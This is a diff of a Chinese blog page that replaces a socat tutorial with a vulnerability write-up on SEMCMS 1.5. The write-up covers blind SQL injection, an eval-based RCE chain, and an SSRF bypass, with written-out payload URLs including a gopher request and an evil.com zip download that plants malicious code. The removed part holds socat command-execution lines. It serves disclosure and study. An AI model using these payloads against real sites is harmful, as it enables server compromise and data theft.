@@ -134,10 +134,10 @@
   <!--[if lt IE 9]> <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script> <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script> <![endif]-->
 
   <!-- ga & ba script hoook -->
-  <link rel="canonical" href="https://morblog.cc/posts/1756077890/">
+  <link rel="canonical" href="https://morblog.cc/posts/1286047278/">
   <title>
     
-      说明 - socat的简单使用 - Morouu的大狗窝 ●&#39;◡&#39;●
+      漏洞挖掘 - SEMCMS1.5 - Morouu的大狗窝 ●&#39;◡&#39;●
     
   </title>
 <meta name="generator" content="Hexo 5.4.0"></head>
@@ -347,19 +347,19 @@
     .body--light {
       /* intro-header */
       --intro-header-background-image-url-home: url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
-      --intro-header-background-image-url-post: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210321215834.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
-      --intro-header-background-image-url-page: url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210321215834.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+      --intro-header-background-image-url-post: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220240988.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+      --intro-header-background-image-url-page: url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220240988.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
     }
     .body--dark {
       --intro-header-background-image-url-home: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('//morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202112302332090.jpg');
-      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210321215834.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
-      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210321215834.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+      --intro-header-background-image-url-post: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220240988.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
+      --intro-header-background-image-url-page: linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.2)), url('/https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220240988.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080');
     }
 
     header.intro-header {
        /*post*/
         background-image: var(--intro-header-background-image-url-post);
-        /* background-image: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/20210321215834.png?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080'); */
+        /* background-image: url('https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220240988.jpg?x-oss-process=image/auto-orient,1/interlace,1/resize,m_fixed,w_1920,h_1080'); */
       
     }
 
@@ -386,16 +386,16 @@
               
               <a class="tag" href="/tags/#安全" title="安全">安全</a>
               
-              <a class="tag" href="/tags/#WEB" title="WEB">WEB</a>
+              <a class="tag" href="/tags/#PHP" title="PHP">PHP</a>
               
-              <a class="tag" href="/tags/#工具" title="工具">工具</a>
+              <a class="tag" href="/tags/#漏洞" title="漏洞">漏洞</a>
               
             </div>
-            <h1>说明 - socat的简单使用</h1>
+            <h1>漏洞挖掘 - SEMCMS1.5</h1>
             <h2 class="subheading"></h2>
             <span class="meta">
               Posted by morouu on
-              2021-12-27
+              2022-01-22
             </span>
 
 
@@ -407,7 +407,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">1.8k</span> In Total
+              Words <span class="post-count">2.3k</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -469,136 +469,209 @@
       <!-- Post Container -->
       <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1 post-container">
 
-        <h1>说明 - socat的简单使用</h1>
+        <h1>漏洞挖掘 - SEMCMS1.5</h1>
 <hr>
-<h2 id="socat-简介">- socat 简介 -</h2>
-<p>socat是一个多功能的网络工具，名字来由是” Socket CAT”，可以看作是netcat的N倍加强版，其原版本是基于Linux的，这里我们使用Windows版本的，因为是移植过来的，需要依赖的库也比较多，所以不是那么的方便，以后的使用可能更多的是基于Linux平台来进行的。</p>
-<p>socat的主要特点就是在两个数据流之间建立通道；且支持众多协议和链接方式：ip, tcp, udp, ipv6, pipe,exec,system,open,proxy,openssl,socket等。</p>
+<h2 id="前言">- 前言 -</h2>
+<p>来自去年安询杯的一道题目，当时好兄弟让我看的，不过由于那会忙着体验生活，就没怎么看，现在补上吧。另外，本文仅供网站管理人员与渗透测试人员学习与交流，任何进行的一切未授权攻击行为与本人无关。</p>
+<p><strong>希望该CMS的开发者能够尽早修复</strong></p>
+<p>在这个 <strong>CMS</strong> 中，会有一个除了管理员外对其他用户未知的后台路径👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211516678.png" alt="image-20220121151645589"></p>
+<p>由此可以对依据访问权限分为三大类，分别为 <strong>不知后台路径(前台)</strong> 、 <strong>已知后台路径但不知管理员密码(隐藏前台)</strong>  以及 <strong>已知后台路径且能登录管理员后台(后台)</strong> ，这里就对这三大类依次进行分析挖掘。</p>
+<h2 id="前台">- 前台 -</h2>
+<h3 id="SQL注入">- SQL注入 -</h3>
+<h4 id="用户注册-登录-订阅提交-评论提交-结算页面-盲注">- 用户注册/登录/订阅提交/评论提交/结算页面(盲注) -</h4>
+<h5 id="分析">- 分析 -</h5>
+<p>罪魁祸首来自没有对 <code>Core/Program/Ant_Contrl.php</code> 文件中的  <code>getIP</code> 函数的调用结果进行过滤，直接来看 <code>getIP</code> 函数👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211607385.png" alt="image-20220121160741290"></p>
+<p>其中，在 <code>Core/Program/Ant_Rponse.php</code> 文件中，有关 <strong>用户注册</strong> 、 <strong>用户登录</strong> 、 <strong>订阅提交</strong> 、<strong>评论提交</strong> 以及 <strong>结算页面</strong> 都直接将调用 <code>getIP</code> 函数的结果进行数据库操作。</p>
+<p><code>用户注册</code> 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211611021.png" alt="image-20220121161118903"></p>
+<p><code>用户登录</code> 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211612415.png" alt="image-20220121161220310"></p>
+<p><code>订阅提交</code> 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211613256.png" alt="image-20220121161321143"></p>
+<p><code>评论提交</code> 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211615716.png" alt="image-20220121161536594"></p>
+<p><code>结算页面</code> 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211616379.png" alt="image-20220121161644273"></p>
+<p>当然，应该还有其他地方调用了 <code>getIP</code> 函数，不过就不一一列出了。</p>
+<p>同时如果跟进 <code>AntAdd</code> 和 <code>AntEdit</code> 函数，可以发现并没有对传入的参数进行操作，而是直接拼接到SQL语句中👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211646825.png" alt="image-20220121164601746"></p>
+<h5 id="证明">- 证明 -</h5>
+<p>那么这里以用户登录为例，先随意注册一个用户👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211631553.png" alt="image-20220121163101465"></p>
+<p>成功注册用户👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211631012.png" alt="image-20220121163148910"></p>
+<p>然后退出登录，并在登录时更改 <code>client-ip</code> 标头内容👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211640046.png" alt="image-20220121164027872"></p>
+<p>显然 <code>sleep</code> 是成功被执行了，因此确实是存在盲注的。</p>
+<h5 id="扩展">- 扩展 -</h5>
+<p>另外，由于在用户注册时候可以进行SQL语句拼接，所以来点 <strong>CTF</strong> 后遗症罢，可以依靠二次数据插入来进行变相回显注入，比如👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211743198.png" alt="image-20220121174328065"></p>
+<p>此时可以看一下数据库内容👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211744686.png" alt="image-20220121174447614"></p>
+<p>使用这个新用户登录👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211746935.png" alt="image-20220121174614848"></p>
+<p>可以显式地得到数据的信息。</p>
+<h4 id="用户地址管理-盲注">-  用户地址管理(盲注) -</h4>
+<h5 id="分析-2">- 分析 -</h5>
+<p>在 <code>Core/Program/Ant_Rponse.php</code> 文件中，漏洞原因是对用户地址进行 <code>edit</code> 功能时，没有仅仅对传入的 <code>$_GET</code> 内容进行了过滤，并没有对用户传入的 <code>$_POST['ID']</code> 进行操作👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211643523.png" alt="image-20220121164350423"></p>
+<p>同样的，在 <code>AntEditAddress</code> 函数中并没有对传入的参数进行任何操作👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211647613.png" alt="image-20220121164703560"></p>
+<h5 id="证明-2">- 证明 -</h5>
+<p>还是先登录账号，然后随便新建一个地址👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211649669.png" alt="image-20220121164919515"></p>
+<p>然后选择刚刚新建的地址并点击进入编辑👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211649488.png" alt="image-20220121164959414"></p>
+<p>之后就是抓包改内容👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211654500.png" alt="image-20220121165420357"></p>
+<p>此时就可以通过更改 <code>$_POST['ID']</code> 的值进行盲注了。</p>
+<h4 id="订阅提交-盲注">- 订阅提交(盲注) -</h4>
+<h5 id="分析-3">- 分析 -</h5>
+<p>漏洞点在 <code>Core/Program/Ant_Rponse.php</code> 文件中，原因是没有对 <code>$_POST['e_coucode']</code> 和 <code>$_POST['e_couid']</code> 进行处理👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211753776.png" alt="image-20220121175358686"></p>
+<p>跟进 <code>CheckDatas</code> 函数👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211755578.png" alt="image-20220121175502520"></p>
+<p>依然是没有对传入的参数进行处理就拼接到了SQL语句中，因此就存在一个盲注。</p>
+<h5 id="证明-3">- 证明 -</h5>
+<p>由于这个功能并没有验证用户的登陆状态，其实直接上 <strong>burp</strong> 找到对应的路由就好了，不必找真正的页面👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211814094.png" alt="image-20220121181407937"></p>
+<p>可以看到 <code>sleep</code> 是成功的被执行了。</p>
 <hr>
-<h2 id="socat-安装">- socat 安装 -</h2>
+<h2 id="隐藏前台">- 隐藏前台 -</h2>
+<h3 id="补充">- 补充 -</h3>
+<p>由于这里的部分是属于 <strong>已知后台路径但不知管理员密码(隐藏前台)</strong> ，因此是过不了管理员登录认证的，一旦某个文件拥有 <code>&lt;?php include_once 'Ant_head.php';?&gt;</code> 这一句代码就可以跳过了。</p>
+<p>因为在 <code>Ant_head.php</code> 文件有以下函数调用👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211825709.png" alt="image-20220121182519666"></p>
+<p>跟进 <code>CheckUser</code> 函数可以发现存在对管理员登录的认证👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211826454.png" alt="image-20220121182622332"></p>
+<p>由此在隐藏目录中，能够访问的页面有以下：</p>
 <ul>
-<li>
-<p>socat 官网：<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a></p>
-</li>
-<li>
-<p>socat 下载地址：<a target="_blank" rel="noopener" href="http://www.dest-unreach.org/socat/download/">http://www.dest-unreach.org/socat/download/</a></p>
-</li>
+<li><code>6gnGtg_Ali/Ant.php</code></li>
+<li><code>6gnGtg_Ali/Ant_Ajax.php</code></li>
+<li><code>6gnGtg_Ali/Ant_Config.php</code></li>
+<li><code>6gnGtg_Ali/Ant_Curl.php</code></li>
+<li><code>6gnGtg_Ali/Ant_Function.php</code></li>
+<li><code>6gnGtg_Ali/Ant_Inc.php</code></li>
+<li><code>6gnGtg_Ali/Ant_left.php</code></li>
+<li><code>6gnGtg_Ali/Ant_mid.php</code></li>
+<li><code>6gnGtg_Ali/Ant_Outdata.php</code></li>
+<li><code>6gnGtg_Ali/Ant_Response.php</code></li>
+<li><code>6gnGtg_Ali/index.php</code></li>
 </ul>
-<h3 id="socat-安装-Linux">- socat 安装 (Linux) -</h3>
+<h3 id="RCE">- RCE -</h3>
+<h4 id="分析-4">- 分析 -</h4>
+<p>能够造成任意代码执行的漏洞点在 <code>Core/Program/Ant_Shop.php</code> 文件的 <code>CheckExpress</code> 函数中，当进行查询物流及费用计算时，会对从 <code>sc_delivery</code> 表中取出的内容进行 <code>eval</code> 调用👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211842109.png" alt="image-20220121184242986"></p>
+<p>显然要能够执行想要执行的代码，这个有关物流信息的 <code>sc_delivery</code> 表就必须可控，而在 <code>6gnGtg_Ali/Ant_Response.php</code> 文件中是存在对其中任意一个表进行任意操作的👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211855096.png" alt="image-20220121185545917"></p>
+<p>此时也就可以基本说是能够随意操控任意一个表的内容了，简单说来整个 <strong>RCE</strong> 的流程为👇</p>
 <ul>
-<li>
-<p>通过源码方式安装：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span> &amp;&amp; mkdir -p socat/src &amp;&amp; <span class="built_in">cd</span> <span class="variable">$HOME</span>/socat/src</span><br><span class="line">wget http://www.dest-unreach.org/socat/download/socat-1.7.3.4.tar.gz</span><br><span class="line">tar zxf socat-1.7.3.4.tar.gz &amp;&amp; <span class="built_in">cd</span> socat-1.7.3.4 &amp;&amp; <span class="variable">$HOME</span>/socat/src/socat-1.7.3.4/configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-<p>若出现 fips 错误，则可以使用以下命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">configure --disable-fips</span><br></pre></td></tr></table></figure>
-<p>或者安装fips：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="variable">$HOME</span> &amp;&amp; mkdir -p fips/src &amp;&amp; <span class="built_in">cd</span> <span class="variable">$HOME</span>/fips/src</span><br><span class="line">wget https://www.openssl.org/<span class="built_in">source</span>/openssl-fips-2.0.16.tar.gz</span><br><span class="line">tar zxf openssl-fips-2.0.16.tar.gz &amp;&amp; <span class="built_in">cd</span> openssl-fips-2.0.16 &amp;&amp; <span class="variable">$HOME</span>/socat/src/openssl-fips-2.0.16/configure</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>通过包安装：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum update &amp;&amp; yum install -y socat</span><br><span class="line">apt-get update &amp;&amp; apt-get install -y socat</span><br></pre></td></tr></table></figure>
-</li>
+<li><code>通过可操作任意表内容的功能构造好合适内容放到sc_delivery表中</code></li>
+<li><code>调用CheckExpress函数取出先前构造好的数据库内容实现RCE</code></li>
 </ul>
-<h3 id="socat-安装-windows">- socat 安装(windows) -</h3>
+<p>那么先来看如何对任意表进行任意内容的构造，由于在 <code>6gnGtg_Ali/Ant_Response.php</code> 文件中并没有数据库信息的配置，也就是说需要事先对 <code>Core/Program/db_con.php</code> 文件进行一个包含，而在 <code>6gnGtg_Ali/Ant_Inc.php</code> 文件就刚好解决了这个问题👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211907769.png" alt="image-20220121190721708"></p>
+<p>因此就可以由 <code>6gnGtg_Ali/Ant_Inc.php</code> 文件作为入口在 <code>6gnGtg_Ali/Ant_Response.php</code> 文件中对任意数据库进行一个任意操作。</p>
+<p>接着再看如何调用最为关键的 <code>CheckExpress</code> 函数，那么来到 <code>Core/Program/Ant_Rponse.php</code> 文件中，可以看到当传入的 <code>$_GET['actions']</code> 值为 <code>CheckOutOrder</code> 且用户状态为已登录时，就可以有可能对 <code>CheckExpress</code> 函数进行一个调用👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211914103.png" alt="image-20220121191402969"></p>
+<p>现在不妨重新理一下完整的 <strong>RCE</strong> 思路👇</p>
 <ul>
-<li>
-<p>通过github安装：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/StudioEtrange/socat-windows</span><br></pre></td></tr></table></figure>
-</li>
+<li><code>注册一个用户</code></li>
+<li><code>登录用户以便获得$UID</code></li>
+<li><code>由6gnGtg_Ali/Ant_Inc.php作为入口点通过6gnGtg_Ali/Ant_Response.php将合适内容插入到sc_delivery表的对应字段中</code></li>
+<li><code>访问Core/Program/Ant_Rponse.php并带上相应的参数，触发调用CheckExpress函数达成RCE</code></li>
 </ul>
+<h4 id="证明-4">- 证明 -</h4>
+<p>由于前面已经注册用户了，这里就不进行用户注册，而是登录前面注册好的用户👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211925015.png" alt="image-20220121192546939"></p>
+<p>然后构造合适的数据由 <code>6gnGtg_Ali/Ant_Inc.php</code> 作为入口点插入 <code>sc_delivery</code> 表👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211932835.png" alt="image-20220121193210696"></p>
+<p>接着访问 <code>Core/Program/Ant_Rponse.php</code> 👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211937182.png" alt="image-20220121193740041"></p>
+<p>此时也就可以进行 <strong>RCE</strong> 了。</p>
+<h3 id="SSRF">- SSRF -</h3>
+<h4 id="分析-5">- 分析 -</h4>
+<p>漏洞点在 <code>6gnGtg_Ali/Ant_Curl.php</code> 文件中，其中对传入的 <code>$_GET['url']</code> 的处理存在漏洞👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211944824.png" alt="image-20220121194447759"></p>
+<p>由于判断逻辑为 <code>if(strpos($dname[2],'sem-cms.cn') !== false)</code> ，而 <code>$dname</code> 来自 <code>$dname=explode(&quot;/&quot;, $_GET['url']);</code> ，仅仅是判断了 <code>?://[判断部分]</code>  中必须包含 <code>sem-cms.cn</code> 内容，那么假若 <code>$_GET['url']</code> 构造成 <code>gopher://sem-cms.cn:1@127.0.0.1:7000/...</code> 也会是合法的。</p>
+<p>那么不妨将 <code>$url</code> 构造成 <code>gopher://sem-cms.cn:1@127.0.0.1:7000/_[SSRF SUCCESS]</code> ，再接着往下看👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211950251.png" alt="image-20220121195024163"></p>
+<p>注意一下此时传入 <code>getFile</code> 函数的参数👇</p>
+<ul>
+<li><code>$url = gopher://sem-cms.cn:1@127.0.0.1:7000/_[SSRF SUCCESS] </code></li>
+<li><code>$save_dir = ../Soft/Zip/</code></li>
+<li><code>$filename = _[SSRF SUCCESS]</code></li>
+<li><code>$type = 1</code></li>
+</ul>
+<p>继续跟进 <code>getFile</code> 函数👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201211959335.png" alt="image-20220121195942215"></p>
+<p>此时 <code>gopher://sem-cms.cn:1@127.0.0.1:7000/_[SSRF SUCCESS]</code> 就会被 <code>curl</code> 。</p>
+<h4 id="证明-5">- 证明 -</h4>
+<p>先监听 <code>7000</code> 端口，然后传入相关参数就好了👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201212004323.png" alt="image-20220121200414133"></p>
+<p>显然是成功利用 <code>gopher</code> 向本地的 <code>7000</code> 端口发送了信息。</p>
+<h4 id="扩展-2">- 扩展 -</h4>
+<p>由于这个功能本意是从官网上下载更新代码👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220208135.png" alt="image-20220122020845974"></p>
+<p>所以可以通过 <code>http://sem-cms.cn:1@evil.com/evil.zip</code> 从远程服务器上将还有恶意代码的 <code>zip</code> 文件下载解压。</p>
+<p>首先将存在恶意代码的文件打包👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220202859.png" alt="image-20220122020241699"></p>
+<p>随意起一个远程服务器👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220203416.png" alt="image-20220122020337364"></p>
+<p>使用 <code>http://sem-cms.cn:1@127.0.0.1:2331/evil.zip</code> 更新恶意压缩包👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220207936.png" alt="image-20220122020711804"></p>
+<p>访问对应的文件👇</p>
+<p><img src="https://morblogib.oss-cn-shanghai.aliyuncs.com/self/images/save/202201220211244.png" alt="image-20220122021159162"></p>
+<p>成功地将存在恶意代码的文件解压出来。</p>
 <hr>
-<h2 id="socat-基本工作原理">- socat 基本工作原理 -</h2>
-<p>socat 的基本语法：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat [option] &lt;address1&gt; &lt;address2&gt;</span><br></pre></td></tr></table></figure>
-<p>socat 实例的生命周期通常由四个阶段组成：</p>
+<h2 id="后台">- 后台 -</h2>
+<h3 id="SQL注入-2">- SQL注入 -</h3>
+<h4 id="分析-6">- 分析 -</h4>
+<p>漏洞点存在多个文件中，影响文件如下：</p>
 <ul>
-<li>
-<p>初始化阶段：</p>
-<ul>
-<li>socat 会先解析命令行选项并初始化日志。</li>
+<li><code>6gnGtg_Ali/Ant_Info.php</code></li>
+<li><code>6gnGtg_Ali/Ant_M_Contry.php</code></li>
+<li><code>6gnGtg_Ali/Ant_M_Member.php</code></li>
+<li><code>6gnGtg_Ali/Ant_M_Order.php</code></li>
+<li><code>6gnGtg_Ali/Ant_Plist.php</code></li>
+<li><code>6gnGtg_Ali/Ant_Pro.php</code></li>
 </ul>
-</li>
-<li>
-<p>开启阶段：</p>
-<ul>
-<li>socat 会先打开第一个地址，然后再打开第二个地址；这些步骤通常是阻塞的；因此，特别是对于负载的地址类型（如socks），会在下一步开始之前完成身份认证。</li>
-</ul>
-</li>
-<li>
-<p>传输阶段：</p>
-<ul>
-<li>socat 会通过via select() 有选择的监视文件的读写流描述符，当数组在一端可用并且可以写入另一端时，socat将读取它，如果有需要，会对换行符进行转换，并将数据写入另一个流的写文件描述符，然后继续双向等待更多数据。（相当于这两个连接中谁有数据传过来就把数据传到另一个连接上，read/write互换）</li>
-</ul>
-</li>
-<li>
-<p>关闭阶段：</p>
-<ul>
-<li>当其中一个流有效的达到EOF时，该阶段就开始了。socat 将EOF的条件转移到另一个流，即尝试只关闭它的写流，给它一个终止的机会。在规定的时间内，socat 会继续向其他方向传输数据，但随后关闭所有剩余的信道并终止。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h2 id="socat-基本用法">- socat 基本用法 -</h2>
-<ul>
-<li>
-<p>简单的读/写文件：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读文件</span></span><br><span class="line">socat - `<span class="built_in">pwd</span>`/a.txt</span><br><span class="line">socat /etc/issue - </span><br><span class="line"></span><br><span class="line"><span class="comment"># 写文件</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;aaa&quot;</span> | socat - /tmp/aaaa <span class="comment"># 不会有回显</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bbb&quot;</span> | socat /tmp/bbbb - <span class="comment"># 会有回显</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ccc&quot;</span> | socat - open:/tmp/cccc,create <span class="comment"># 不会有回显</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ddd&quot;</span> | socat open:/tmp/dddd,create,append - <span class="comment"># 会有回显，这个执行顺序是先显示/tmp/dddd文件的内容，然后再写入</span></span><br></pre></td></tr></table></figure>
-<p>其中 <strong>‘ - ‘</strong> 相当于 <strong>STDIN</strong> + <strong>STDOUT</strong>，也就是读写流，由于socat会有选择的处理数据流，因此用socat进行简单的读/写文件，<strong>’ - ‘</strong> 的顺序不重要。</p>
-</li>
-<li>
-<p>简单的执行命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 执行命令</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ls&quot;</span> | socat - <span class="built_in">exec</span>:bash,stderr</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ls&quot;</span> | socat <span class="built_in">exec</span>:bash,stderr - </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ls&quot;</span> | socat - system:bash,stderr</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>连接/监听TCP/UDP：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 连接TCP/UDP</span></span><br><span class="line"></span><br><span class="line">socat - tcp-connect:127.0.0.1:2333</span><br><span class="line">socat - udp-connect:127.0.0.1:2333</span><br><span class="line"></span><br><span class="line"><span class="comment"># 监听TCP/UDP</span></span><br><span class="line"></span><br><span class="line">socat tcp-listen:2333 -</span><br><span class="line">socat tcp-listen:2333 -</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>向TCP/UDP端口发送数据：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 向TCP发送数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> | socat - tcp-connect:127.0.0.1:2333</span><br><span class="line">cat /etc/issue | socat - tcp-connect:127.0.0.1:2333</span><br><span class="line">socat /etc/issue tcp-connect:127.0.0.1:2333</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向UDP发送数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello&quot;</span> | socat - udp-connect:127.0.0.1:2333</span><br><span class="line">cat /etc/issue | socat - udp-connect:127.0.0.1:2333</span><br><span class="line">socat /etc/issue udp-connect:127.0.0.1:2333</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>端口转发：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 